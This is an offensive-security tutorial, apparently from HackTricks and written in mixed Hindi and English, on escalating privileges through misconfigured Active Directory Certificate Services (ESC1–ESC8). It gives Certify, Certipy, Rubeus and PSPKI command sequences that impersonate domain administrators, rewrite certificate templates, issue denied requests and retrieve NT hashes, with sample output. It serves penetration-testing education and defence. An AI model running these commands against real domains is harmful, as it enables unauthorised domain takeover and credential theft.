# AD CS Domain Escalation

{{#include ../../../banners/hacktricks-training.md}}


**यह posts के escalation technique sections का सारांश है:**

- [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)<sup>[[6]](#references)</sup>
- [https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)<sup>[[7]](#references)</sup>
- [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)

## गलत तरीके से कॉन्फ़िगर किए गए Certificate Templates - ESC1

### व्याख्या

### गलत तरीके से कॉन्फ़िगर किए गए Certificate Templates - ESC1 की व्याख्या

- **Enterprise CA द्वारा low-privileged users को Enrolment rights दिए गए हैं।**
- **Manager approval आवश्यक नहीं है।**
- **Authorized personnel के signatures आवश्यक नहीं हैं।**
- **Certificate templates पर Security descriptors अत्यधिक permissive हैं, जिससे low-privileged users को enrolment rights प्राप्त करने की अनुमति मिलती है।**
- **Certificate templates को authentication की सुविधा देने वाले EKUs परिभाषित करने के लिए कॉन्फ़िगर किया गया है:**
- Client Authentication (OID 1.3.6.1.5.5.7.3.2), PKINIT Client Authentication (1.3.6.1.5.2.3.4), Smart Card Logon (OID 1.3.6.1.4.1.311.20.2.2), Any Purpose (OID 2.5.29.37.0) या कोई EKU नहीं (SubCA) जैसे Extended Key Usage (EKU) identifiers शामिल हैं।
- **Certificate Signing Request (CSR) में subjectAltName शामिल करने की requesters की क्षमता template द्वारा अनुमत है:**
- Active Directory (AD), यदि मौजूद हो, तो identity verification के लिए certificate में subjectAltName (SAN) को प्राथमिकता देता है। इसका अर्थ है कि CSR में SAN निर्दिष्ट करके किसी भी user (जैसे domain administrator) का impersonation करने के लिए certificate request किया जा सकता है। Requester द्वारा SAN निर्दिष्ट किया जा सकता है या नहीं, यह certificate template के AD object में `mspki-certificate-name-flag` property द्वारा दर्शाया जाता है। यह property एक bitmask है, और `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` flag की मौजूदगी requester द्वारा SAN निर्दिष्ट करने की अनुमति देती है।

> [!CAUTION]
> ऊपर दिया गया configuration low-privileged users को अपनी पसंद के किसी भी SAN के साथ certificates request करने की अनुमति देता है, जिससे Kerberos या SChannel के माध्यम से किसी भी domain principal के रूप में authentication संभव हो जाता है।

यह feature कभी-कभी products या deployment services द्वारा HTTPS या host certificates को on-the-fly generate करने के लिए enable किया जाता है, या समझ की कमी के कारण।

यह ध्यान देने योग्य है कि इस option के साथ certificate बनाने पर warning दिखाई देती है। हालांकि, ऐसा तब नहीं होता जब किसी existing certificate template (जैसे `WebServer` template, जिसमें `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` enabled है) को duplicate करके उसमें authentication OID शामिल करने के लिए modify किया जाता है।<sup>[[6]](#references)</sup>

### दुरुपयोग

**vulnerable certificate templates खोजने** के लिए आप चला सकते हैं:
```bash
Certify.exe find /vulnerable
certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128
```
इस **vulnerability का abuse करके administrator को impersonate करने के लिए** यह चलाया जा सकता है:
```bash
# Impersonate by setting SAN to a target principal (UPN or sAMAccountName)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator@corp.local

# Optionally pin the target's SID into the request (post-2022 SID mapping aware)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator /sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Some CAs accept an otherName/URL SAN attribute carrying the SID value as well
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator \
/url:tag:microsoft.com,2022-09-14:sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Certipy equivalent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' \
-template 'ESC1' -upn 'administrator@corp.local'
```
फिर आप जनरेट किए गए **certificate को `.pfx`** format में बदल सकते हैं और इसका उपयोग फिर से **Rubeus या certipy का उपयोग करके authenticate** करने के लिए कर सकते हैं:<sup>[[5]](#references)</sup>
```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```
Windows binaries "Certreq.exe" और "Certutil.exe" का उपयोग PFX बनाने के लिए किया जा सकता है: https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee

AD Forest के configuration schema में certificate templates की enumeration, विशेष रूप से उन templates की जिन्हें approval या signatures की आवश्यकता नहीं होती, जिनमें Client Authentication या Smart Card Logon EKU होता है, और जिनमें `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` flag enabled होता है, निम्नलिखित LDAP query चलाकर की जा सकती है:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```
## गलत तरीके से कॉन्फ़िगर किए गए Certificate Templates - ESC2

### व्याख्या

दूसरा abuse scenario पहले वाले का एक variation है:

1. Enterprise CA द्वारा low-privileged users को enrollment rights दिए गए हैं।
2. Manager approval की requirement disabled है।
3. Authorized signatures की आवश्यकता हटा दी गई है।
4. Certificate template पर अत्यधिक permissive security descriptor low-privileged users को certificate enrollment rights प्रदान करता है।
5. **Certificate template को Any Purpose EKU या बिना EKU के शामिल करने के लिए define किया गया है।**

**Any Purpose EKU** attacker को **किसी भी उद्देश्य** के लिए certificate प्राप्त करने की अनुमति देता है, जिसमें client authentication, server authentication, code signing आदि शामिल हैं। **ESC3 के लिए उपयोग की गई समान technique** का उपयोग इस scenario का शोषण करने के लिए किया जा सकता है।

**बिना EKUs** वाले certificates, जो subordinate CA certificates के रूप में कार्य करते हैं, का **किसी भी उद्देश्य** के लिए शोषण किया जा सकता है और इनका उपयोग **नए certificates को sign करने के लिए भी किया जा सकता है**। इसलिए, attacker subordinate CA certificate का उपयोग करके नए certificates में मनमाने EKUs या fields निर्दिष्ट कर सकता है।

हालांकि, **domain authentication** के लिए बनाए गए नए certificates काम नहीं करेंगे यदि subordinate CA पर **`NTAuthCertificates`** object द्वारा trust नहीं किया गया हो, जो default setting है। फिर भी, attacker **किसी भी EKU** और मनमाने certificate values वाले **नए certificates बना सकता है**। इनका संभावित रूप से विभिन्न उद्देश्यों (जैसे code signing, server authentication आदि) के लिए **abuse** किया जा सकता है और इनके network में मौजूद अन्य applications, जैसे SAML, AD FS या IPSec, पर महत्वपूर्ण प्रभाव पड़ सकते हैं।<sup>[[6]](#references)</sup>

AD Forest के configuration schema में इस scenario से मेल खाने वाले templates की enumeration करने के लिए, निम्नलिखित LDAP query चलाई जा सकती है:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```
## Misconfigured Enrolment Agent Templates - ESC3

### Explanation

यह scenario पहले और दूसरे वाले जैसा है, लेकिन इसमें **एक अलग EKU** (Certificate Request Agent) और **2 अलग templates** का **abuse** किया जाता है (इसलिए इसमें requirements के 2 sets होते हैं),

**Certificate Request Agent EKU** (OID 1.3.6.1.4.1.311.20.2.1), जिसे Microsoft documentation में **Enrollment Agent** के नाम से जाना जाता है, किसी principal को **किसी अन्य user की ओर से certificate के लिए enroll** करने की अनुमति देता है।

**“enrollment agent”** ऐसे **template** में enroll करता है और प्राप्त **certificate का उपयोग दूसरे user की ओर से CSR को co-sign करने के लिए करता है**। इसके बाद वह **co-signed CSR** को CA को भेजता है और ऐसे **template** में enroll करता है जो **“enroll on behalf of”** की अनुमति देता है। CA **“दूसरे” user से संबंधित certificate** के साथ response करता है।<sup>[[6]](#references)</sup>

**Requirements 1:**

- Enterprise CA द्वारा low-privileged users को enrollment rights दिए गए हैं।
- Manager approval की requirement हटा दी गई है।
- Authorized signatures की कोई requirement नहीं है।
- Certificate template का security descriptor अत्यधिक permissive है और low-privileged users को enrollment rights देता है।
- Certificate template में Certificate Request Agent EKU शामिल है, जिससे अन्य principals की ओर से अन्य certificate templates का request करना संभव होता है।

**Requirements 2:**

- Enterprise CA low-privileged users को enrollment rights देता है।
- Manager approval को bypass किया गया है।
- Template का schema version या तो 1 है या 2 से अधिक है, और यह ऐसी Application Policy Issuance Requirement निर्दिष्ट करता है जिसके लिए Certificate Request Agent EKU आवश्यक है।
- Certificate template में defined एक EKU domain authentication की अनुमति देता है।
- CA पर enrollment agents के लिए restrictions लागू नहीं की गई हैं।

### Abuse

इस scenario का **abuse** करने के लिए आप [**Certify**](https://github.com/GhostPack/Certify) या [**Certipy**](https://github.com/ly4k/Certipy) का उपयोग कर सकते हैं:<sup>[[4]](#references)</sup>
```bash
# Request an enrollment agent certificate
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:Vuln-EnrollmentAgent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```
**उपयोगकर्ता**, जिन्हें **enrollment agent certificate प्राप्त करने** की अनुमति है, वे templates जिनमें enrollment **agents** को enroll करने की अनुमति है, और वे **accounts** जिनकी ओर से enrollment agent कार्य कर सकता है, enterprise CAs द्वारा सीमित किए जा सकते हैं। यह `certsrc.msc` **snap-in** खोलकर, **CA पर right-click करके**, **Properties** पर **click करके**, और फिर “Enrollment Agents” tab पर **navigating** करके किया जाता है।

हालाँकि, यह ध्यान दिया गया है कि CAs की **default** setting “**Do not restrict enrollment agents**” होती है। जब administrators द्वारा enrollment agents पर restriction enable की जाती है और इसे “Restrict enrollment agents” पर set किया जाता है, तब भी default configuration अत्यधिक permissive रहती है। यह **Everyone** को सभी templates में किसी भी व्यक्ति के रूप में enroll करने की access देती है।

## Vulnerable Certificate Template Access Control - ESC4

### **Explanation**

**certificate templates** पर मौजूद **security descriptor**, template से संबंधित **AD principals** के पास मौजूद विशिष्ट **permissions** को define करता है।

यदि किसी **attacker** के पास किसी **template** को **alter** करने और **prior sections** में बताई गई कोई भी **exploitable misconfigurations** **institute** करने के लिए आवश्यक **permissions** हों, तो privilege escalation संभव हो सकता है।

Certificate templates पर लागू होने वाली उल्लेखनीय permissions में शामिल हैं:<sup>[[6]](#references)</sup>

- **Owner:** Object पर implicit control प्रदान करता है और किसी भी attributes को modify करने की अनुमति देता है।
- **FullControl:** Object पर पूर्ण authority सक्षम करता है, जिसमें किसी भी attributes को alter करने की capability शामिल है।
- **WriteOwner:** Object के owner को attacker के control वाले principal में बदलने की अनुमति देता है।
- **WriteDacl:** Access controls को adjust करने की अनुमति देता है, जिससे attacker को FullControl दिया जा सकता है।
- **WriteProperty:** किसी भी object properties को edit करने की अनुमति देता है।

### Abuse

Templates और अन्य PKI objects पर edit rights वाले principals की पहचान करने के लिए Certify से enumerate करें:
```bash
Certify.exe find /showAllPermissions
Certify.exe pkiobjects /domain:corp.local /showAdmins
```
पिछले वाले जैसा privesc का एक उदाहरण:

<figure><img src="../../../images/image (814).png" alt=""><figcaption></figcaption></figure>

ESC4 तब होता है जब किसी user के पास certificate template पर write privileges होते हैं। इसका दुरुपयोग certificate template के configuration को overwrite करके template को ESC1 के प्रति vulnerable बनाने के लिए किया जा सकता है।

जैसा कि हम ऊपर दिए गए path में देख सकते हैं, ये privileges केवल `JOHNPC` के पास हैं, लेकिन हमारे user `JOHN` के पास `JOHNPC` से जुड़ा नया `AddKeyCredentialLink` edge है। चूंकि यह technique certificates से संबंधित है, इसलिए मैंने इस attack को भी implement किया है, जिसे [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab) के नाम से जाना जाता है।<sup>[[8]](#references)</sup> यहाँ victim का NT hash retrieve करने के लिए Certipy के `shadow auto` command की एक छोटी-सी झलक है।
```bash
certipy shadow auto 'corp.local/john:Passw0rd!@dc.corp.local' -account 'johnpc'
```
**Certipy** एक ही command से certificate template की configuration को overwrite कर सकता है। **default** रूप से, Certipy configuration को overwrite करके इसे **ESC1 के लिए vulnerable** बना देगा। हम **`-save-old` parameter देकर पुरानी configuration को save** भी कर सकते हैं, जो हमारे attack के बाद configuration को **restore** करने में उपयोगी होगा।
```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```
## Vulnerable PKI Object Access Control - ESC5

### विवरण

आपस में जुड़े ACL-based relationships का विस्तृत जाल, जिसमें certificate templates और certificate authority के अलावा कई objects शामिल होते हैं, पूरे AD CS system की security को प्रभावित कर सकता है। ये objects, जो security पर महत्वपूर्ण प्रभाव डाल सकते हैं, इनमें शामिल हैं:

- CA server का AD computer object, जिसे S4U2Self या S4U2Proxy जैसे mechanisms के माध्यम से compromise किया जा सकता है।
- CA server का RPC/DCOM server।
- विशिष्ट container path `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>` के भीतर कोई भी descendant AD object या container। इस path में Certificate Templates container, Certification Authorities container, NTAuthCertificates object और Enrollment Services Container जैसे containers और objects शामिल हैं, लेकिन यह सूची इन्हीं तक सीमित नहीं है।

यदि कोई low-privileged attacker इन critical components में से किसी पर control प्राप्त कर लेता है, तो PKI system की security compromise हो सकती है।<sup>[[6]](#references)</sup>

## EDITF_ATTRIBUTESUBJECTALTNAME2 - ESC6

### विवरण

[**CQure Academy post**](https://cqureacademy.com/blog/enhanced-key-usage) में चर्चा किया गया subject, Microsoft द्वारा बताए गए **`EDITF_ATTRIBUTESUBJECTALTNAME2`** flag के प्रभावों को भी स्पर्श करता है। Certification Authority (CA) पर activate किए जाने पर यह configuration **any request** में **user-defined values** को **subject alternative name** में शामिल करने की अनुमति देती है, जिसमें Active Directory® से बनाए गए requests भी शामिल हैं। परिणामस्वरूप, यह सुविधा किसी **intruder** को **domain authentication** के लिए configured **any template** के माध्यम से enroll करने की अनुमति देती है—विशेष रूप से वे templates जो **unprivileged** users के enrollment के लिए खुले हों, जैसे standard User template। इसके परिणामस्वरूप, एक certificate प्राप्त किया जा सकता है, जिससे intruder domain administrator या domain के भीतर मौजूद **any other active entity** के रूप में authenticate कर सकता है।<sup>[[9]](#references)</sup>

**Note**: Certificate Signing Request (CSR) में **alternative names** जोड़ने का तरीका, जिसमें `certreq.exe` में `-attrib "SAN:"` argument (जिसे “Name Value Pairs” कहा जाता है) का उपयोग किया जाता है, ESC1 में SANs की exploitation strategy से अलग है। यहां अंतर इस बात में है कि account information को **कैसे encapsulate किया जाता है**—एक extension के बजाय certificate attribute के भीतर।

### Abuse

Setting activated है या नहीं, यह verify करने के लिए organizations `certutil.exe` के साथ निम्नलिखित command का उपयोग कर सकती हैं:
```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```
यह ऑपरेशन मूलतः **remote registry access** का उपयोग करता है, इसलिए, एक वैकल्पिक तरीका हो सकता है:
```bash
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```
[**Certify**](https://github.com/GhostPack/Certify) और [**Certipy**](https://github.com/ly4k/Certipy) इस misconfiguration का पता लगाने और इसका exploit करने में सक्षम हैं:<sup>[[4]](#references)</sup>
```bash
# Detect vulnerabilities, including this one
Certify.exe find

# Exploit vulnerability
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```
इन settings को बदलने के लिए, यदि किसी के पास **domain administrative** अधिकार या समकक्ष permissions हों, तो निम्न command किसी भी workstation से execute की जा सकती है:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```
अपने environment में इस configuration को disable करने के लिए, flag को इससे हटाया जा सकता है:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```
> [!WARNING]
> मई 2022 के security updates के बाद जारी किए गए नए **certificates** में एक **security extension** शामिल होगा, जिसमें **requester की `objectSid` property** शामिल होती है। ESC1 के लिए, यह SID निर्दिष्ट SAN से प्राप्त होता है। हालांकि, **ESC6** के लिए, SID SAN के बजाय **requester की `objectSid`** को दर्शाता है।\
> ESC6 का exploit करने के लिए, यह आवश्यक है कि system ESC10 (Weak Certificate Mappings) के प्रति susceptible हो, जो **नई security extension के बजाय SAN को प्राथमिकता देता है**।

## Vulnerable Certificate Authority Access Control - ESC7

### Attack 1

#### Explanation

Certificate authority के लिए access control permissions के एक set के माध्यम से बनाए रखा जाता है, जो CA actions को नियंत्रित करता है। इन permissions को `certsrv.msc` खोलकर, किसी CA पर right-click करके, properties चुनकर और फिर Security tab पर जाकर देखा जा सकता है। इसके अतिरिक्त, PSPKI module का उपयोग करके निम्नलिखित commands से permissions enumerate की जा सकती हैं:
```bash
Get-CertificationAuthority -ComputerName dc.domain.local | Get-CertificationAuthorityAcl | select -expand Access
```
यह प्राथमिक rights, अर्थात **`ManageCA`** और **`ManageCertificates`**, के बारे में जानकारी प्रदान करता है, जो क्रमशः “CA administrator” और “Certificate Manager” की roles से संबंधित हैं।<sup>[[6]](#references)</sup>

#### दुरुपयोग

Certificate authority पर **`ManageCA`** rights होने से principal, PSPKI का उपयोग करके settings को remotely manipulate कर सकता है। इसमें **`EDITF_ATTRIBUTESUBJECTALTNAME2`** flag को toggle करना भी शामिल है, जिससे किसी भी template में SAN specification की अनुमति मिलती है; यह domain escalation का एक critical aspect है।

PSPKI के **Enable-PolicyModuleFlag** cmdlet का उपयोग करके इस process को सरल बनाया जा सकता है, जिससे direct GUI interaction के बिना modifications की जा सकती हैं।

**`ManageCertificates`** rights होने से pending requests को approve करना संभव हो जाता है, जिससे "CA certificate manager approval" safeguard को effectively circumvent किया जा सकता है।

Certificate request, approval और download करने के लिए **Certify** और **PSPKI** modules के combination का उपयोग किया जा सकता है:
```bash
# Request a certificate that will require an approval
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.domain.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.domain.local\theshire-DC-CA /id:336
```
### Attack 2

#### व्याख्या

> [!WARNING]
> **पिछले attack** में **`Manage CA`** permissions का उपयोग **EDITF_ATTRIBUTESUBJECTALTNAME2** flag को **enable** करने और **ESC6 attack** को perform करने के लिए किया गया था, लेकिन CA service (`CertSvc`) को restart किए जाने तक इसका कोई प्रभाव नहीं होगा। जब किसी user के पास **`Manage CA`** access right होता है, तो उसे **service restart** करने की भी अनुमति होती है। हालांकि, इसका यह अर्थ नहीं है कि user service को remotely restart कर सकता है। इसके अलावा, May 2022 security updates के कारण अधिकांश patched environments में E**SC6 संभवतः out of the box काम नहीं करेगा**।

इसलिए, यहां एक अन्य attack प्रस्तुत किया गया है।

आवश्यकताएँ:

- केवल **`ManageCA` permission**
- **`Manage Certificates`** permission (**`ManageCA`** से grant की जा सकती है)
- Certificate template **`SubCA`** **enabled** होना चाहिए (**`ManageCA`** से enable किया जा सकता है)

यह technique इस तथ्य पर निर्भर करती है कि `Manage CA` _और_ `Manage Certificates` access right वाले users **failed certificate requests** issue कर सकते हैं। **`SubCA`** certificate template **ESC1** के प्रति vulnerable है, लेकिन template में enroll केवल **administrators** कर सकते हैं। इसलिए, एक **user** **`SubCA`** में enroll करने का **request** कर सकता है - जिसे **deny** कर दिया जाएगा - लेकिन **बाद में manager द्वारा issue** कर दिया जाएगा।<sup>[[6]](#references)</sup>

#### दुरुपयोग

आप स्वयं को एक नए officer के रूप में add करके **`Manage Certificates`** access right **grant** कर सकते हैं।
```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```
**`SubCA`** template को `-enable-template` parameter के साथ **CA पर enable** किया जा सकता है। डिफ़ॉल्ट रूप से, `SubCA` template enabled होता है।
```bash
# List templates
certipy ca -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```
यदि हमने इस attack के लिए prerequisites पूरे कर लिए हैं, तो हम **`SubCA` template के आधार पर certificate का अनुरोध** करके शुरुआत कर सकते हैं।

**यह अनुरोध अस्वीकार कर दिया जाएगा**, लेकिन हम private key सेव करेंगे और request ID नोट कर लेंगे।
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```
हमारे **`Manage CA` और `Manage Certificates`** के साथ, हम `ca` command और `-issue-request <request ID>` parameter का उपयोग करके **विफल certificate request** को जारी कर सकते हैं।
```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```
और अंत में, हम `req` कमांड और `-retrieve <request ID>` पैरामीटर के साथ **जारी किए गए certificate को प्राप्त** कर सकते हैं।
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```
### Attack 3 – Manage Certificates Extension Abuse (SetExtension)

#### Explanation

क्लासिक ESC7 abuses (EDITF attributes enable करना या pending requests को approve करना) के अलावा, **Certify 2.0** ने एक बिल्कुल नया primitive सामने लाया है, जिसके लिए Enterprise CA पर केवल *Manage Certificates* (जिसे **Certificate Manager / Officer** role भी कहा जाता है) role की आवश्यकता होती है।<sup>[[3]](#references)</sup>

`ICertAdmin::SetExtension` RPC method को *Manage Certificates* रखने वाला कोई भी principal execute कर सकता है। हालांकि इस method का उपयोग पारंपरिक रूप से legitimate CAs द्वारा **pending** requests पर extensions update करने के लिए किया जाता था, attacker इसका abuse करके approval की प्रतीक्षा कर रही request में एक ***non-default* certificate extension** (उदाहरण के लिए `1.1.1.1` जैसा custom *Certificate Issuance Policy* OID) append कर सकता है।

क्योंकि targeted template उस extension के लिए **default value define नहीं करता**, इसलिए request जारी होने पर CA attacker-controlled value को overwrite नहीं करेगा। परिणामस्वरूप certificate में attacker द्वारा चुना गया extension शामिल होगा, जो:

* अन्य vulnerable templates की Application / Issuance Policy requirements को पूरा कर सकता है (जिससे privilege escalation हो सकती है)।
* अतिरिक्त EKUs या policies inject कर सकता है, जो third-party systems में certificate को अप्रत्याशित trust प्रदान करें।

संक्षेप में, *Manage Certificates* — जिसे पहले ESC7 का “कम शक्तिशाली” हिस्सा माना जाता था — अब CA configuration को बदले बिना या अधिक restrictive *Manage CA* right की आवश्यकता के बिना full privilege escalation या long-term persistence के लिए leverage किया जा सकता है।

#### Certify 2.0 के साथ primitive का abuse

1. **ऐसी certificate request submit करें जो *pending* रहे।** इसे manager approval की आवश्यकता वाले template से force किया जा सकता है:
```powershell
Certify.exe request --ca SERVER\\CA-NAME --template SecureUser --subject "CN=User" --manager-approval
# Take note of the returned Request ID
```

2. नई `manage-ca` command का उपयोग करके pending request में **custom extension append करें**:
```powershell
Certify.exe manage-ca --ca SERVER\\CA-NAME \
--request-id 1337 \
--set-extension "1.1.1.1=DER,10,01 01 00 00"  # fake issuance-policy OID
```
*यदि template में पहले से *Certificate Issuance Policies* extension define नहीं है, तो ऊपर दिया गया value issuance के बाद preserve रहेगा।*

3. **Request issue करें** (यदि आपके role के पास *Manage Certificates* approval rights भी हैं) या किसी operator द्वारा इसे approve करने की प्रतीक्षा करें। Issue होने के बाद certificate download करें:
```powershell
Certify.exe request-download --ca SERVER\\CA-NAME --id 1337
```

4. परिणामी certificate में अब malicious issuance-policy OID शामिल है और इसका उपयोग subsequent attacks (जैसे ESC13, domain escalation आदि) में किया जा सकता है।

> NOTE: यही attack `ca` command और `-set-extension` parameter के माध्यम से Certipy ≥ 4.7 से भी execute किया जा सकता है।

## NTLM Relay to AD CS HTTP Endpoints – ESC8

### Explanation

> [!TIP]
> जिन environments में **AD CS installed** है, यदि कोई **web enrollment endpoint vulnerable** मौजूद हो और कम-से-कम एक **certificate template published** हो, जो **domain computer enrollment और client authentication** की अनुमति देता हो (जैसे default **`Machine`** template), तो **spooler service active** वाले किसी भी computer को attacker compromise कर सकता है!

AD CS द्वारा कई **HTTP-based enrollment methods** supported हैं, जो administrators द्वारा install किए जा सकने वाले additional server roles के माध्यम से उपलब्ध होते हैं। HTTP-based certificate enrollment के ये interfaces **NTLM relay attacks** के प्रति susceptible हैं। एक attacker, **compromised machine से, inbound NTLM के माध्यम से authenticate करने वाले किसी भी AD account का impersonate कर सकता है**। Victim account का impersonate करते हुए, attacker इन web interfaces को access करके `User` या `Machine` certificate templates का उपयोग करके client authentication certificate request कर सकता है।

- **web enrollment interface** (`http://<caserver>/certsrv/` पर उपलब्ध पुराना ASP application) default रूप से केवल HTTP का उपयोग करता है, जो NTLM relay attacks से कोई protection प्रदान नहीं करता। इसके अतिरिक्त, यह अपने Authorization HTTP header के माध्यम से केवल NTLM authentication को explicitly permit करता है, जिससे Kerberos जैसी अधिक secure authentication methods लागू नहीं हो पातीं।
- **Certificate Enrollment Service** (CES), **Certificate Enrollment Policy** (CEP) Web Service और **Network Device Enrollment Service** (NDES) default रूप से अपने Authorization HTTP header के माध्यम से negotiate authentication support करते हैं। Negotiate authentication **Kerberos और NTLM दोनों** को support करता है, जिससे attacker relay attacks के दौरान authentication को **NTLM पर downgrade** कर सकता है। हालांकि ये web services default रूप से HTTPS enable करती हैं, HTTPS अकेले **NTLM relay attacks से protection नहीं देता**। HTTPS services को NTLM relay attacks से protection तभी मिल सकती है जब HTTPS को channel binding के साथ combine किया जाए। दुर्भाग्य से, AD CS IIS पर Extended Protection for Authentication activate नहीं करता, जो channel binding के लिए आवश्यक है।<sup>[[6]](#references)</sup>

NTLM relay attacks के साथ एक सामान्य **issue** NTLM sessions की **कम अवधि** और उन services के साथ interact न कर पाना है जो **NTLM signing require** करती हैं।

फिर भी, user के लिए certificate acquire करने के लिए NTLM relay attack का abuse करके इस limitation को दूर किया जा सकता है, क्योंकि certificate की validity period session की duration निर्धारित करती है और certificate का उपयोग उन services के साथ किया जा सकता है जो **NTLM signing mandate** करती हैं। Stolen certificate का उपयोग करने के instructions के लिए देखें:


{{#ref}}
account-persistence.md
{{#endref}}

NTLM relay attacks की एक अन्य limitation यह है कि **attacker-controlled machine को victim account द्वारा authenticate किया जाना चाहिए**। Attacker या तो प्रतीक्षा कर सकता है या इस authentication को **force** करने का प्रयास कर सकता है:


{{#ref}}
../printers-spooler-service-abuse.md
{{#endref}}

### **Abuse**

[**Certify**](https://github.com/GhostPack/Certify) का `cas` **enabled HTTP AD CS endpoints** enumerate करता है:<sup>[[4]](#references)</sup>
```
Certify.exe cas
```
<figure><img src="../../../images/image (72).png" alt=""><figcaption></figcaption></figure>

`msPKI-Enrollment-Servers` property का उपयोग enterprise Certificate Authorities (CAs) द्वारा Certificate Enrollment Service (CES) endpoints को store करने के लिए किया जाता है। इन endpoints को **Certutil.exe** tool का उपयोग करके parse और list किया जा सकता है:
```
certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
```
<figure><img src="../../../images/image (757).png" alt=""><figcaption></figcaption></figure>
```bash
